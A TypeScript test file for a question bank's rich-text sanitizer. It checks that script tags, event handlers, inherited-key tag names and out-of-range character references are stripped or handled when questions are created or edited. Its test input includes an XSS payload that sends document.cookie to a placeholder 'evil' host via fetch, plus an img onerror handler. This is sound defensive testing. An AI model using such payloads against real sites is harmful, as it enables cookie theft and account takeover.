/**
 * The rich-text subset is a closed list, and this is where that is proved.
 *
 * The subset was documented as enforced "on the way in", and the exporters'
 * guarantee about what they emit depends on it, but no write path called the
 * sanitizer: a stem carrying a script tag validated, round-tripped through the
 * bank byte for byte, and was handed to a player unchanged. These tests cover
 * the enforcement and the three ways the sanitizer itself could be escaped.
 */

import { strict as assert } from "node:assert";
import { describe, it } from "node:test";

import { createQuestion, editQuestion } from "../src/model/create.ts";
import { richTextToPlain, sanitizeRichText } from "../src/model/richtext.ts";

const nasty = '<p>Pick one</p><script>fetch("//evil/" + document.cookie)</script><img src=x onerror=alert(1)>';

describe("the subset is enforced where questions are written", () => {
  it("strips disallowed markup when a question is created", () => {
    const q = createQuestion({ type: "essay", stem: { format: "rich", content: nasty }, body: {} });
    assert.equal(q.stem.content, "<p>Pick one</p>");
    assert.ok(!q.stem.content.includes("script"));
    assert.ok(!q.stem.content.includes("onerror"));
  });

  it("strips disallowed markup when a question is edited", () => {
    const q = createQuestion({ type: "essay", stem: "Clean.", body: {} });
    const edited = editQuestion(q, { stem: { format: "rich", content: nasty } });
    assert.equal(edited.stem.content, "<p>Pick one</p>");
  });

  it("reaches rich text nested inside a body, not just the stem", () => {
    const q = createQuestion({
      type: "multipleChoice",
      stem: "Which one?",
      body: {
        shuffle: false,
        options: [
          { id: "o1", content: { format: "rich", content: "<strong>Paris</strong><script>x()</script>" }, correct: true },
          { id: "o2", content: { format: "rich", content: "Rome" }, correct: false },
        ],
      },
    });
    const options = (q.body as { options: Array<{ content: { content: string } }> }).options;
    assert.equal(options[0]!.content.content, "<strong>Paris</strong>");
  });

  it("derives the title from the cleaned stem, not the raw one", () => {
    const q = createQuestion({ type: "essay", stem: { format: "rich", content: nasty }, body: {} });
    assert.ok(!q.title.includes("fetch"), "a tag in the source must not reach the title either");
  });

  it("leaves plain text alone, because it is text and not markup", () => {
    const q = createQuestion({
      type: "essay",
      stem: { format: "plain", content: "Is 5 < 7 and x > 3?" },
      body: {},
    });
    assert.equal(q.stem.content, "Is 5 < 7 and x > 3?");
  });
});

describe("the sanitizer cannot be escaped through the allow-list itself", () => {
  it("does not treat inherited object keys as allowed tags", () => {
    // ALLOWED_TAGS is a plain object, so <constructor> and <__proto__> used to
    // pass the allow-list test by inheriting from Object.prototype.
    const result = sanitizeRichText("<constructor>surprise</constructor>");
    assert.equal(result.html, "surprise");
    assert.ok(result.removedTags.includes("constructor"));
  });

  it("does not throw when an inherited key is given attributes", () => {
    // The same lookup returned Object.prototype instead of an array, and the
    // attribute check then crashed on it.
    const result = sanitizeRichText('<constructor colspan="2">x</constructor>');
    assert.equal(result.html, "x");
  });

  it("does not throw on an out-of-range character reference", () => {
    // This was enough to make an entire bank unopenable, because the search
    // index is built over every stem on open.
    assert.doesNotThrow(() => richTextToPlain({ format: "rich", content: "&#x110000;" }));
    assert.equal(richTextToPlain({ format: "rich", content: "&#x110000;" }), "&#x110000;");
  });

  it("still decodes the references that are in range", () => {
    assert.equal(richTextToPlain({ format: "rich", content: "caf&#xe9;" }), "café");
    assert.equal(richTextToPlain({ format: "rich", content: "5 &lt; 7" }), "5 < 7");
  });
});
